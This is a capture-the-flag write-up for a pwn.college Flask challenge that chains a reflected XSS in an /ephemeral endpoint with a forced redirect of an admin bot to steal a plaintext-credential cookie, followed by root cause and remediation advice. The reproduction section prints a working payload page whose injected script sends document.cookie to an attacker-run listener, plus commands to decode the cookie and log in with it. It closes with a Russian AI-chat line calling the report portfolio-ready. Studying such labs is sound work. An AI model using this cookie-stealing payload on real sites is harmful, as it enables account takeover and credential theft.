# CSRF-to-XSS-to-Cookie-Leak-pwn.college-pwnpost-
The "pwnpost" Flask application has a Reflected XSS vulnerability in the /ephemeral endpoint. Because the application lacks CSRF protection, an attacker can force an authenticated admin bot to visit a malicious page. This page redirects the bot to the vulnerable endpoint, which executes JavaScript to steal the admin's auth cookie.
The cookie contains the admin's username and password in plaintext, allowing full account takeover and access to the hidden flag.
Impact

Critical. An attacker can steal the admin's credentials in plaintext, leading to:

    Full Account Takeover: The auth cookie stores username|password. An attacker can log in as the admin and access all private data (including the hidden flag).

    Session Hijacking: The stolen cookie can be used directly to bypass authentication.

    Data Exfiltration: The attacker can read drafts and private posts that are hidden from regular users.

Reproduction Steps
1. Preparation

Start the vulnerable server:
./challenge/server &

Start the attacker's HTTP server:
python3 -m http.server 1337 > server.log 2>&1 &

2. Craft the Payload (index.html)

Create index.html in the directory served by the attacker's server. The script dynamically builds an XSS payload, encodes it, and redirects the bot to the vulnerable endpoint.

<!DOCTYPE html>
<html>
<body>
    <script>
        // Build XSS payload dynamically to avoid breaking our own <script> tag
        var xss = '<scr' + 'ipt>' + 
                  'fetch("http://hacker.localhost:1337/?c=" + btoa(document.cookie))' + 
                  '</scr' + 'ipt>';
        
        // URL-encode and manually encode '+' to '%2B' (to avoid it becoming a space)
        var encoded = encodeURIComponent(xss).replace(/\+/g, '%2B');
        
        // Redirect the bot to the vulnerable endpoint
        window.location.href = 'http://challenge.localhost/ephemeral?msg=' + encoded;
    </script>
</body>
</html>


3. Trigger the Bot

Submit the URL http://hacker.localhost:1337 to the admin bot (via the challenge interface).
4. Capture the Cookie

The bot visits the page, gets redirected to the vulnerable endpoint, and the reflected XSS executes. The bot's cookie is sent to the attacker's server via a GET request. Check server.log:

cat server.log


You will see a line like:
127.0.0.1 - - [29/Oct/2026 08:42:05] "GET /?c=YXV0aD1hZG1pbnwuUVg1a3pNend5TXdFRE4yRXpXfQ== HTTP/1.1" 200 -

5. Decode the Cookie

Decode the Base64 string:

echo 'YXV0aD1hZG1pbnwuUVg1a3pNend5TXdFRE4yRXpXfQ==' | base64 -d


Result:

auth=admin|.QX5kzMzwyMwEDN2EzW}

6. Log In as Admin and Get the Flag

Use the stolen cookie to access the main page and extract the flag:

curl -L -b "auth=admin|.QX5kzMzwyMwEDN2EzW}" http://challenge.localhost/ | grep -o "pwn.college{[^}]*}"

Root Cause

The vulnerability is a combination of three flaws:

    Reflected XSS in /ephemeral: The endpoint reflects the msg parameter directly into the HTML without escaping.


    The message: {flask.request.args.get("msg", "(none)")}


    No CSRF Protection: The application does not validate Origin or Referer headers. An attacker can force an authenticated user (the admin bot) to make requests to the vulnerable endpoint.

Insecure Cookie Storage: The auth cookie stores the username and password in plaintext (username|password), and it is not marked as HttpOnly. This allows JavaScript to read and exfiltrate it.


Remediation

    Escape Output: Use markupsafe.escape to sanitize the msg parameter.


from markupsafe import escape
The message: {escape(flask.request.args.get("msg", "(none)"))}

    Implement CSRF Protection: Add CSRF tokens to all state-changing requests and validate Origin/Referer headers.

    Secure Cookie Handling:

        Never store passwords in cookies.

        Use a signed session token instead.

        Set the HttpOnly flag to prevent JavaScript access.

        Set the Secure flag to enforce HTTPS.

        Set the SameSite attribute to Strict or Lax.

Lessons Learned

    XSS is not just about alert(): It can be used to steal credentials and escalate privileges.

    CSRF can be a delivery mechanism for XSS: Even a simple GET request can trigger a devastating XSS chain.

    Plaintext credentials in cookies are a critical mistake: Always use opaque, signed tokens and set HttpOnly.

    URL encoding is tricky: The + character in URLs decodes to a space. Always encode it as %2B when building payloads.

References

    OWASP: Cross Site Scripting (XSS)

    OWASP: Cross-Site Request Forgery (CSRF)

    PortSwigger: Reflected XSS

Это готово к публикации. Скопируй, вставь в README.md, закоммить. Ты прошел путь от «что это за хуйня» до профессионального отчета. Это уже не «я учусь». Это портфолио.
This response is AI-generated, for reference only.




